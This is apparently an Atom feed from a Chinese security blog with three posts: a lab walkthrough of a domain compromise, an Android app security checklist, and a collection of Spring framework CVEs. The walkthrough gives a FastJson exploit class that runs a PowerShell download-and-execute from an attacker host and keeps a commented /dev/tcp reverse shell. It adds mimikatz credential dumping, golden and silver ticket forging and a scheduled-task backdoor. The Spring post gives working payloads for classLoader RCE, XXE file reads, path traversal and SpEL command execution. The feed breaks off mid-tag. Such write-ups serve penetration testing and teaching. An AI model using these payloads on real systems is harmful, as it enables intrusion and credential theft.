<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Misaki&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="/"/>
  <updated>2020-04-10T08:32:09.028Z</updated>
  <id>/</id>
  
  <author>
    <name>Misaki</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>域靶场WP</title>
    <link href="/2020/04/%E5%9F%9F%E9%9D%B6%E5%9C%BAWP/"/>
    <id>/2020/04/域靶场WP/</id>
    <published>2020-04-10T08:31:54.000Z</published>
    <updated>2020-04-10T08:32:09.028Z</updated>
    
    <content type="html"><![CDATA[<p>域环境利用已有靶场，简单方便<a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/3/" target="_blank" rel="noopener">http://vulnstack.qiyuanxuetang.net/vuln/detail/3/</a></p><p>web环境漏洞FastJson。利用<a href="https://github.com/RealBearcat/FastJson-JdbcRowSetImpl-RCE" target="_blank" rel="noopener">https://github.com/RealBearcat/FastJson-JdbcRowSetImpl-RCE</a> 修改而来</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410114455.png" alt="image-20200407153757538"></p><p>参数为json字符串，可以简单的使用如下探测是否存在问题。</p><pre><code>{&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;dnslog&quot;}{&quot;@type&quot;:&quot;java.net.Inet6Address&quot;,&quot;val&quot;:&quot;dnslog&quot;}{&quot;@type&quot;:&quot;java.net.InetSocketAddress&quot;{&quot;address&quot;:,&quot;val&quot;:&quot;dnslog&quot;}}</code></pre><p>比如，此处使用burp的DNS监听</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410114500.png" alt="image-20200407140108169"></p><p>执行后会发现，说明存在问题。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410114502.png" alt="image-20200407140121264"></p><p>至于版本，可以在一般测试中，构造错误的json字符串查看报错信息，但此处没有错误显示，直接使用几个较高版本的POC测试。</p><p>此处直接使用47的POC，由于是Windows系统，则利用cs使用powershell来反弹shell。</p><pre><code>import java.lang.Runtime;import java.lang.Process;public class Exploit {    public Exploit(){        try{            // Runtime.getRuntime().exec(&quot;/bin/bash -i &gt;&amp;/dev/tcp/192.168.120.130/8888&lt;&amp;1&quot;);            Runtime.getRuntime().exec(&quot;powershell.exe -nop -w hidden -c \&quot;IEX ((new-object net.webclient).downloadstring(\&#39;http://192.168.120.130:80/a\&#39;))\&quot;&quot;);        }catch(Exception e){            e.printStackTrace();        }    }    public static void main(String[] argv){        Exploit e = new Exploit();    }}</code></pre><p>执行后，在cs端就可以收到shell了。利用ms15-051提权，提权模块可能是添加的插件。获得system权限。还可以看到存在一个内网地址10.10.10.80。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410114504.png" alt="image-20200408095902201"></p><p>利用mimikatz获取密码，只能读取到当前登陆账号的明文密码。</p><pre><code>mimikatz sekurlsa::logonpasswords</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410114506.png" alt="image-20200408134439940"></p><p>不过如果使用了管理员账号来执行操作修改配置，也可以读取到管理员hash。如果使用明文密码登陆修改就可以抓到。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410114508.png" alt="image-20200408151440720"></p><p>如果提示报错，尝试修改注册表</p><pre><code>reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f</code></pre><p>收集信息可知以下信息</p><pre><code>域名：DC.de1ay.com域主机：10.10.10.10域用户：Administrator，delay,mssql域管理员：Administrator两个网卡：192.168.120.0/24，10.10.10.0/24主机：存在两个主机(192.168.120.201，10.10.10.10)存在360主机防御系统，不过并没有干涉</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410114510.png" alt="image-20200408100546410"></p><p>尝试利用de1ay用户来登陆PC，利用psexec登陆不成功。</p><p>使用psexec登陆，DC机显示成功但是没有获得shell，可能是没成功把</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410114512.png" alt="image-20200408155334127"></p><p>然后利用net共享，先用mimikatz生成pth凭据。</p><pre><code>sekurlsa::pth /domain:. /user:Administrator /ntlm: 70be8675cd511daa9be4b8f49e829327</code></pre><p>net和psexec的时候还是不成功，报错。利用cs自身的pth模块执行，还是报错，拒绝访问</p><pre><code>pth DE1AY\de1ay 161cff084477fe596a5db81874498a24</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410114514.png" alt="image-20200408163645027"></p><p>再尝试利用金票，直接登陆到主机上，上传mimikatz执行。</p><pre><code>lsadump::dcsync /domain:de1ay.com /user:krbtgt</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410114515.png" alt="image-20200409164051760"></p><p>得到HASH之后使用mimikatz中的kerberos::golden功能生成金票golden.kiribi  </p><pre><code>kerberos::golden /admin:administrator /domain:de1ay.com /sid:S-1-5-21-2756371121-2868759905-3853650604 /krbtgt:82dfc71b72a11ef37d663047bc2088fb /ticket:golden.kiribi</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410114517.png" alt="image-20200409164616356"></p><p>通过mimikatz中的kerberos::ptt将golden.kiribi导入内存中 </p><pre><code>kerberos::purge   //删除票据kerberos::ptt golden.kiribi  //导入票据kerberos::list  //查看票据</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410114519.png" alt="image-20200409164906689"></p><p>查看DC域主机默认共享，可以连接到域主机，上传文件执行。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410114520.png" alt="image-20200409165120018"></p><p>先利用域内主机创建一个端口转发，先创建一个dns的监听，然后利用已有shell。再去创建一个listener。如下dc。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410114522.png" alt="image-20200409172526385"></p><p>或者直接利用已有shell来创建listener，再生成exe。利用dc监听来生成exe</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410114524.png" alt="image-20200409172758964"></p><p>利用<code>copy beacon.exe \\DC.de1ay.com\c$\Users\de1ay\</code>到DC主机上</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410114526.png" alt="image-20200409170358135"></p><p>创建计划任务执行后门，很快就有DC主机上线了。</p><pre><code>schtasks /create /s DC.de1ay.com /ru &quot;SYSTEM&quot; /tn testdc /sc DAILY /tr C:\\Users\\de1ay\\beacon.exe /Fschtasks /run /s DC.de1ay.com /tn testdc /i</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410114527.png" alt="image-20200409173044533"></p><p>对于用户PC机，同样可以利用金票来执行，后面的操作和上面类似。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410114529.png" alt="image-20200409174013572"></p><p>最后就可以获得shell。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410114530.png" alt="image-20200409174748884"></p><p>再尝试使用银票，生成前删除全部票据，不能访问。</p><pre><code>klist purge</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410114532.png" alt="image-20200410090753302"></p><p>这里使用de1ay的hash</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410114534.png" alt="image-20200410091300403"></p><pre><code>kerberos::golden /domain:de1ay.com /sid:S-1-5-21-2756371121-2868759905-3853650604 /target:DC.de1ay.org /service:cifs /rc4:161cff084477fe596a5db81874498a24 /user:de1ay /ptt</code></pre><p>这里使用/ptt直接导入内存，或者先生成票据，再使用上面的kerberos::ptt导入内存。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410114536.png" alt="image-20200410091815717"></p><p>查看是否可以访问</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410114538.png" alt="image-20200410091924771"></p><p>同样shell以后可以看到是个用户权限</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410114540.png" alt="image-20200410092340435"></p><p>在尝试使用ms14-068，DC机是Windows2012，没有补丁KB3011780，同样删除票据</p><p>由于主机上没有python环境，pykek不能使用，暂时没有exe版本的pykek。下载使用编译完成的exe文件</p><p><a href="https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068" target="_blank" rel="noopener">https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068</a></p><pre><code>ms14-068.exe -u de1ay@de1ay.com -s S-1-5-21-2756371121-2868759905-3853650604 -d DC.de1ay.com</code></pre><p>生成cache缓存文件，再使用mimikatz来导入</p><pre><code>kerberos::ptc TGT_de1ay@de1ay.com.ccache</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410114542.png" alt="image-20200410100442974"></p><p>不过回过头看，之前在cs中执行利用psexec和已有凭据执行psh的时候应该是成功的。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410114544.png" alt="image-20200410113800119"></p><p>执行后在DC上会有短暂的ps调用显示，但至于为啥没有回显和连接，也许是连接错误。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;域环境利用已有靶场，简单方便&lt;a href=&quot;http://vulnstack.qiyuanxuetang.net/vuln/detail/3/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://vulnstack.qiyuanxuetang.n
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>APP应用安全检测</title>
    <link href="/2020/04/APP%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E6%A3%80%E6%B5%8B/"/>
    <id>/2020/04/APP应用安全检测/</id>
    <published>2020-04-10T08:30:24.000Z</published>
    <updated>2020-04-10T08:30:33.382Z</updated>
    
    <content type="html"><![CDATA[<h2 id="测试说明"><a href="#测试说明" class="headerlink" title="测试说明"></a>测试说明</h2><p>测试内容根据绿盟APP测试流程进行检查，APP是前几年谷歌CTF的中的APK。</p><h2 id="客户端安全"><a href="#客户端安全" class="headerlink" title="客户端安全"></a>客户端安全</h2><h3 id="安装包签名"><a href="#安装包签名" class="headerlink" title="安装包签名"></a>安装包签名</h3><pre><code>jarsigner.exe -verify WhyShouldIPay.apk -verbose -certs</code></pre><p>输出结果为“jar 已验证”时，表示签名正常。  </p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410162840.png" alt="image-20200410140458826"></p><h3 id="程序保护"><a href="#程序保护" class="headerlink" title="程序保护"></a>程序保护</h3><p>此处使用jadx打开APK，若软件使用混淆好加壳则不存在问题。如下打开后是下面这种，则是没添加保护。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410162841.png" alt="image-20200410140922318"></p><h3 id="应用完整性检测"><a href="#应用完整性检测" class="headerlink" title="应用完整性检测"></a>应用完整性检测</h3><p>反编译APK，修改其中的res资源文件，把其中的一个图片替换为其他图片</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410162843.png" alt="image-20200410141438100"></p><p>如果完整性是检查MANIFEST.MF 中的数据则存在风险。若回编译后安装使用正常，则代表无检查。</p><h3 id="组件安全"><a href="#组件安全" class="headerlink" title="组件安全"></a>组件安全</h3><p>主要查看是否存在<code>android:exported=&quot;true&quot;</code>属性的组件，存在属性的组件可以被第三方导出。但是部分组件需要被调用来执行，比如组件中存在<code>&lt;intent-filter&gt;</code>过滤器。这种组件就相当于允许导出。</p><p>根据不同的要求这种情况不一定算是风险项。比如此activity组件，由于是首启动页。需要被调用执行，也就不存在上面所说的不允许被导出情况。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410162846.png" alt="image-20200410144025704"></p><h3 id="webview组件安全"><a href="#webview组件安全" class="headerlink" title="webview组件安全"></a>webview组件安全</h3><p>Android 4.2 版本以下的 webview 组件存在安全漏洞 ，检测本地是否会被利用的方式是允许运行的sdk最小不能低于17，来避免在受影响的手机上使用。</p><p><img src="APP应用安全检测.assets/image-20200410144355967.png" alt="image-20200410144355967"></p><h2 id="敏感信息安全"><a href="#敏感信息安全" class="headerlink" title="敏感信息安全"></a>敏感信息安全</h2><h3 id="数据文件"><a href="#数据文件" class="headerlink" title="数据文件"></a>数据文件</h3><p>查看安装app目录文件权限是否为<code>rw-rw----</code>当前用户可读性模式。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410162847.png" alt="image-20200410145303695"></p><p>如果文件目录下存在database目录，db类型的文件，说明使用本地数据库，查看数据文件是否有明文敏感信息。</p><h3 id="日志文件"><a href="#日志文件" class="headerlink" title="日志文件"></a>日志文件</h3><p>查看日志文件中是否输出了一些敏感信息，比如账号密码，认证session等</p><p>可以通过adb命令查看，也可以使用第三方连接软件查看<code>adb logcat</code></p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410162849.png" alt="image-20200410145927703"></p><h2 id="密码键盘安全性"><a href="#密码键盘安全性" class="headerlink" title="密码键盘安全性"></a>密码键盘安全性</h2><h3 id="屏幕录像"><a href="#屏幕录像" class="headerlink" title="屏幕录像"></a>屏幕录像</h3><p>这种问题从测过的软件和客户来看，在意的程度不高，可能也就在银行金融类APP上会比较在意。</p><p>比如利用adb截图来测试是否可以对屏幕进行记录<code>adb shell /system/bin/screencap -p /path/a.png</code></p><p>如果打开后，可以看到输入的数据，或者可以看到键盘点击反馈则算安全问题。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410162850.png" alt="image-20200410151346239"></p><h3 id="随机键盘"><a href="#随机键盘" class="headerlink" title="随机键盘"></a>随机键盘</h3><p>这种目前只在银行APP支付的时候输入银行卡密码的时候存在，一般APP并没有此要求。可以根据情况来确定是否需要检测此项。</p><h2 id="安全策略"><a href="#安全策略" class="headerlink" title="安全策略"></a>安全策略</h2><h3 id="密码复杂度"><a href="#密码复杂度" class="headerlink" title="密码复杂度"></a>密码复杂度</h3><p>APP登陆的密码一般要求大小写字母和数字，需要其中两种以上，不少于八位。如果允许使用纯数字或者纯字母，且长度没有要求的情况下，则存在问题。</p><h3 id="账号登陆限制"><a href="#账号登陆限制" class="headerlink" title="账号登陆限制"></a>账号登陆限制</h3><p>根据业务需要，是否允许同一个账号多设备登陆同时操作，如果不允许则尝试多设备登陆，登陆正常使用则存在问题。</p><h3 id="账号锁定机制"><a href="#账号锁定机制" class="headerlink" title="账号锁定机制"></a>账号锁定机制</h3><p>账号可能存在被爆破密码的可能，在有些不适合使用验证码的场景下，对账号执行登陆错误次数的限制是可以有效防止账号被暴力破解的方式之一。</p><h3 id="验证码安全性"><a href="#验证码安全性" class="headerlink" title="验证码安全性"></a>验证码安全性</h3><p>查看使用的验证码是否能被简单识别，使用能正常使用和防止登陆中被多次验证的问题</p><h3 id="安全退出"><a href="#安全退出" class="headerlink" title="安全退出"></a>安全退出</h3><p>账号在登陆退出后，查看是否正确的注销session。利用原session是否还可以请求到数据。</p><h3 id="密码修改验证"><a href="#密码修改验证" class="headerlink" title="密码修改验证"></a>密码修改验证</h3><p>验证修改密码的功能是否存在问题，是否需要原密码判断，修改的复杂度等是否符合要求</p><h3 id="activity-界面劫持"><a href="#activity-界面劫持" class="headerlink" title="activity 界面劫持"></a>activity 界面劫持</h3><p>如果攻击者注册一个receiver，响应android.intent.action.BOOT_COMPLETED，使得开启启动一个service；在这个service中启动一个计时器，不停枚举当前进程中是否有预设的进程启动，如果发现有预设进程，则使用FLAG_ACTIVITY_NEW_TASK启动自己的钓鱼界面，而正常应用的界面则隐藏在钓鱼界面的后面。</p><p>比如使用<a href="https://github.com/abigbread/Hijack来创建一个apk。循环监听设置好的app。" target="_blank" rel="noopener">https://github.com/abigbread/Hijack来创建一个apk。循环监听设置好的app。</a></p><h2 id="进程防护"><a href="#进程防护" class="headerlink" title="进程防护"></a>进程防护</h2><h3 id="动态注入"><a href="#动态注入" class="headerlink" title="动态注入"></a>动态注入</h3><p>可以利用成熟的HOOK框架来尝试，比如使用xpose，在对于进程文件中，查看maps文件。其中可以看到对于的xpose文件</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410162854.png" alt="image-20200410155352701"></p><p>或者使用Frida来加载其中的所有的类，查看是否正常获取。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410162856.png" alt="image-20200410161814489"></p><h2 id="通信安全"><a href="#通信安全" class="headerlink" title="通信安全"></a>通信安全</h2><h3 id="通信加密"><a href="#通信加密" class="headerlink" title="通信加密"></a>通信加密</h3><p>这种更像是web漏洞，主要查看是否使用了https加密流量，并且是否有正确的证书配置。加密算法是否在TLSv1.1以上。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;测试说明&quot;&gt;&lt;a href=&quot;#测试说明&quot; class=&quot;headerlink&quot; title=&quot;测试说明&quot;&gt;&lt;/a&gt;测试说明&lt;/h2&gt;&lt;p&gt;测试内容根据绿盟APP测试流程进行检查，APP是前几年谷歌CTF的中的APK。&lt;/p&gt;
&lt;h2 id=&quot;客户端安全&quot;&gt;&lt;a 
      
    
    </summary>
    
    
      <category term="Android逆向" scheme="/tags/Android%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>Spring 框架漏洞集合</title>
    <link href="/2020/04/Spring-%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/"/>
    <id>/2020/04/Spring-框架漏洞集合/</id>
    <published>2020-04-01T05:18:10.000Z</published>
    <updated>2020-04-01T05:18:10.516Z</updated>
    
    <content type="html"><![CDATA[<p>虽说是Spring框架漏洞，但以下包含并不仅Spring Framework，Spring Boot，还有Spring Cloud，Spring Data，Spring Security等。</p><h3 id="CVE-2010-1622-Spring-Framework-class-classLoader类远程代码执行"><a href="#CVE-2010-1622-Spring-Framework-class-classLoader类远程代码执行" class="headerlink" title="CVE-2010-1622 Spring Framework class.classLoader类远程代码执行"></a>CVE-2010-1622 Spring Framework class.classLoader类远程代码执行</h3><p>影响版本：SpringSource Spring Framework 3.0.0 - 3.0.2、SpringSource Spring Framework 2.5.0 - 2.5.7</p><p>Spring框架提供了一种机制，该机制使用客户端提供的数据来更新对象属性。这个机制允许攻击者修改用于加载对象的类加载器的属性（通过’class.classloader’）。这可能导致任意命令执行，例如，攻击者可以修改URL。由类加载器用来指向攻击者控制的位置。</p><pre><code>示例：POST /adduser HTTP/1.0...firstName = Tavis&amp;lastName = Ormandy如果Person是表单的支持对象，则firstName和lastName属性将设置为相应的值。为了支持更复杂的类，Spring还支持点表示法，因此user.address.street = Disclosure + Str。将等效于：frmObj.getUser().getAddress().setStreet(&quot;Disclosure Str.&quot;)  问题是Spring Beans的CachedIntrospectionResults类枚举了可从用户表单提交中设置的属性，使用  java.beans.Introspector.getBeanInfo()而不指定停止类，这意味着&#39; class &#39;属性及其后的所有内容均可用于HTTP请求中的设置。攻击如果攻击者使用以下HTTP参数向表单控制器提交HTTP请求：POST /adduser HTTP/1.0...class.classLoader.URLs[0] = jar:http://attacker/spring-exploit.jar!她将 使用自己的网址覆盖frmObj.getClass().getClassLoader().getURLs() 返回的数组中的第0个元素.它将是哪个类加载器？在Apache Tomcat上的情况下，它指org.apache.catalina.loader.WebappClassLoader</code></pre><p>如何构造这个jar，需要包含以下信息：</p><pre><code>- META-INF/spring-form.tld - 定义spring表单标签并指定实现为标签文件而不是类- META-INF/tags/中的标签文件，包含有标签定义（任意Java代码）</code></pre><p>/META-INF/spring-form.tld文件：</p><pre><code>&lt;!-- &lt;form:input/&gt; tag --&gt;    &lt;tag-file&gt;    &lt;name&gt;input&lt;/name&gt;    &lt;path&gt;/META-INF/tags/InputTag.tag&lt;/path&gt;  &lt;/tag-file&gt;</code></pre><p>/META-INF/tags/InputTag.tag</p><pre><code>&lt;%@ tag dynamic-attributes=&quot;dynattrs&quot; %&gt;&lt;% j java.lang.Runtime.getRuntime().exec(&quot;mkdir /tmp/PWNED&quot;); %&gt;</code></pre><p>做出这样的替换后，当开发者在controller中将任何一个对象绑定表单，并且最终展示的jsp内容有下面这些：</p><pre><code>&lt;%@ taglib prefix=&quot;form&quot; uri=&quot;http://www.springframework.org/tags/form&quot;%&gt;  &lt;form:form commandName=&quot;user&quot;&gt;&lt;form:input path=&quot;name&quot;/&gt;&lt;/form:form&gt;</code></pre><p>攻击者访问url,即可触发远程代码执行的效果:</p><pre><code>http://inbreak.net/springmvc/testjsp.htm? class.classLoader.URLs[0]=jar:https://inbreak.net/spring-exploit.jar!/</code></pre><p>如果服务器大于tomcat6.0.28版本，这样做会把所有的input标签替换掉，导致不能正常显示。需要修改</p><p>spring-form.tld，给其中的inputtag改名，name改为inputkxlzx：</p><pre><code>&lt;tag&gt;        &lt;name&gt;inputkxlzx&lt;/name&gt;  //什么名字都行</code></pre><p>在文件中新加入一个tag，叫做input：</p><pre><code>&lt;tag-file&gt;    &lt;name&gt;input&lt;/name&gt;    &lt;path&gt;/WEB-INF/tags/InputTag.tag&lt;/path&gt;  &lt;/tag-file&gt;</code></pre><p>InputTag.tag的内容：</p><pre><code>&lt;%@ tag dynamic-attributes=&quot;dynattrs&quot; %&gt;&lt;%if (request.getParameter(&quot;kxlzxcmd&quot;)!=null)     exec(request.getParameter(&quot;kxlzxcmd&quot;)); %&gt;&lt;form:inputkxlzx path=&quot;${dynattrs.path}&quot;&gt;&lt;/form:inputkxlzx&gt;</code></pre><p>访问的时候需要在参数中携带kxlzxcmd</p><pre><code>/test.htm?name=kxlzx&amp;kxlzxcmd=calc   //包含input的页面</code></pre><p><a href="http://blog.o0o.nu/2010/06/cve-2010-1622.html" target="_blank" rel="noopener">http://blog.o0o.nu/2010/06/cve-2010-1622.html</a></p><p><a href="https://www.inbreak.net/archives/377" target="_blank" rel="noopener">https://www.inbreak.net/archives/377</a></p><h3 id="CVE-2013-4152-Spring-Framework中的XML外部实体（XXE）注入"><a href="#CVE-2013-4152-Spring-Framework中的XML外部实体（XXE）注入" class="headerlink" title="CVE-2013-4152 Spring Framework中的XML外部实体（XXE）注入"></a>CVE-2013-4152 Spring Framework中的XML外部实体（XXE）注入</h3><p>影响版本：3.0.0至3.2.3、4.0.0.M1</p><p>受影响版本容易受到XML外部实体（XXE）注入的攻击。该<code>SourceHttpMessageConverter</code>处理器不会禁用外部实体解析，这使远程攻击者可以读取任意文件。</p><p>当传输xml结构体时，如</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;   &lt;username&gt;John&lt;/username&gt;&lt;/xml&gt;</code></pre><p>外部XML实体- <code>xxe</code>是使用系统标识符定义的，并存在于DOCTYPE标头中。这些实体可以访问本地或远程内容。例如，以下代码包含一个外部XML实体，该实体将获取的内容 <code>/etc/passwd</code>并将其显示给呈现给用户。</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&lt;!DOCTYPE foo [   &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;   &lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;/xml&gt;</code></pre><p>其他XXE注入攻击可以访问可能无法停止返回数据的本地资源，这可能会影响应用程序可用性并导致拒绝服务。</p><h3 id="CVE-2013-7315-Spring-Framework中的XML外部实体"><a href="#CVE-2013-7315-Spring-Framework中的XML外部实体" class="headerlink" title="CVE-2013-7315 Spring Framework中的XML外部实体"></a>CVE-2013-7315 Spring Framework中的XML外部实体</h3><p>影响版本：3.2.0至3.2.3、4.0.0.M1-4.0.0.M2（Spring MVC）</p><p>由于对 <strong>CVE-2013-4152</strong>和<strong>CVE-2013-6429的</strong>修复不完整导致。</p><p>受影响版本容易受到XML外部实体（XXE）注入的攻击。该<code>SourceHttpMessageConverter</code>处理器不会禁用外部实体解析，这使远程攻击者可以读取任意文件。</p><p>当传输xml结构体时，如</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;   &lt;username&gt;John&lt;/username&gt;&lt;/xml&gt;</code></pre><p>外部XML实体- <code>xxe</code>是使用系统标识符定义的，并存在于DOCTYPE标头中。这些实体可以访问本地或远程内容。例如，以下代码包含一个外部XML实体，该实体将获取的内容 <code>/etc/passwd</code>并将其显示给呈现给用户。</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&lt;!DOCTYPE foo [   &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;   &lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;/xml&gt;</code></pre><p>其他XXE注入攻击可以访问可能无法停止返回数据的本地资源，这可能会影响应用程序可用性并导致拒绝服务。</p><h3 id="CVE-2014-3527-Spring-Security验证绕过漏洞"><a href="#CVE-2014-3527-Spring-Security验证绕过漏洞" class="headerlink" title="CVE-2014-3527 Spring Security验证绕过漏洞"></a>CVE-2014-3527 Spring Security验证绕过漏洞</h3><p>影响版本：</p><pre><code>SpringSource Spring Security 3.1-3.2.4</code></pre><pre><code>当使用从Spring Security 3.1到3.2.4的CAS代理票证身份验证时，恶意的CAS服务可能会欺骗另一个CAS服务来认证未关联的代理票证。这是由于以下事实：代理票证身份验证使用了来自HttpServletRequest的信息，该信息是根据HTTP请求中的不可信信息填充的。这意味着，如果存在CAS服务可以相互认证的访问控制限制，则可以绕过这些限制。如果用户未使用CAS代理票证，并且未基于CAS服务做出访问控制决策，则对用户没有影响。</code></pre><h3 id="CVE-2014-0097-Spring-Security认证绕过"><a href="#CVE-2014-0097-Spring-Security认证绕过" class="headerlink" title="CVE-2014-0097 Spring Security认证绕过"></a>CVE-2014-0097 Spring Security认证绕过</h3><p>影响版本：Spring Security 3.2.0至3.2.1和3.1.0至3.1.5</p><pre><code>ActiveDirectoryLdapAuthenticator不检查密码长度。如果目录允许匿名绑定，则它可能会错误地验证提供空密码的用户。</code></pre><h3 id="CVE-2014-3578-Spring-Framework-目录遍历漏洞"><a href="#CVE-2014-3578-Spring-Framework-目录遍历漏洞" class="headerlink" title="CVE-2014-3578 Spring Framework 目录遍历漏洞"></a>CVE-2014-3578 Spring Framework 目录遍历漏洞</h3><p>影响版本：</p><pre><code>Spring Framework:- 3.0.4 to 3.2.11- 4.0.0 to 4.0.7- 4.1.0 to 4.1.1</code></pre><p>在web.xml存在如下情况下存在目录遍历：</p><pre><code>&lt;mvc:resources mapping=&quot;/css/**&quot; location=&quot;file:webapps/springapp/WEB-INF/classes/theme/css/&quot; /&gt;</code></pre><p>访问：</p><pre><code>GET /springapp/css/file:/etc/passwd</code></pre><h3 id="CVE-2016-2173-Spring-AMQP中的远程代码执行"><a href="#CVE-2016-2173-Spring-AMQP中的远程代码执行" class="headerlink" title="CVE-2016-2173 Spring AMQP中的远程代码执行"></a>CVE-2016-2173 Spring AMQP中的远程代码执行</h3><p>影响版本：1.0.0至1.5.4</p><p><a href="https://github.com/HaToan/CVE-2016-2173" target="_blank" rel="noopener">https://github.com/HaToan/CVE-2016-2173</a></p><p>使用方式：</p><pre><code>- ysoserial-0.0.4-all.jar create payload write and execute a shell    + java -jar ysoserial-0.0.4-all.jar &#39;library_vul&#39; &#39;command&#39;- exploit-cve2016-2173.jar : send to App vul    + java -jar exploit-cve2016-2173.jar </code></pre><p>本来想根据配置来搭一个环境处理，结果环境一直搭不起来，构建各种失败，就先放这个利用poc把。</p><h3 id="CVE-2016-4977-SpringSecurityOauth-远程命令执行漏洞"><a href="#CVE-2016-4977-SpringSecurityOauth-远程命令执行漏洞" class="headerlink" title="CVE-2016-4977 SpringSecurityOauth 远程命令执行漏洞"></a>CVE-2016-4977 SpringSecurityOauth 远程命令执行漏洞</h3><p>影响版本：2.0.0-2.0.9、1.0.0-1.0.5</p><p><a href="https://www.seebug.org/vuldb/ssvid-92474" target="_blank" rel="noopener">https://www.seebug.org/vuldb/ssvid-92474</a></p><p>漏洞利用POC：</p><pre><code>http://localhost:8080/oauth/authorize?response_type=token&amp;client_id=acme&amp;redirect_uri=${2334-1}</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200401131645.png" alt="image-20200331090423266"></p><p>执行命令：</p><pre><code>http://207.246.79.196:8080/oauth/authorize?response_type=token&amp;client_id=acme&amp;redirect_uri=${T(java.lang.Runtime).getRuntime().exec(%22ping%20xxx.ceye.io%22)}</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200401131647.png" alt="image-20200331092210362"></p><p>但是此命令执行，不会在页面上显示，只会打印出运行的对象。</p><p>如果要执行反弹shell等命令，由于页面HTML编码的原因，SPEL返回值时进行了一次html编码，所以导致取出的  值时会进行一次转义，利用如下脚本加工。</p><pre><code>#coding:utf-8message = input(&#39;Enter message to encode:&#39;)print(&#39;Decoded string (in ASCII):\n&#39;)print(&#39;T(java.lang.Character).toString(%s)&#39; % ord(message[0]), end=&quot;&quot;)for ch in message[1:]:   print(&#39;.concat(T(java.lang.Character).toString(%s))&#39; % ord(ch), end=&quot;&quot;), print(&#39;\n&#39;)print(&#39;new java.lang.String(new byte[]{&#39;, end=&quot;&quot;),print(ord(message[0]), end=&quot;&quot;)for ch in message[1:]:   print(&#39;,%s&#39; % ord(ch), end=&quot;&quot;), print(&#39;)}&#39;)</code></pre><p>执行输出后再添加：</p><pre><code>T(java.lang.Runtime).getRuntime().exec(payload)</code></pre><h3 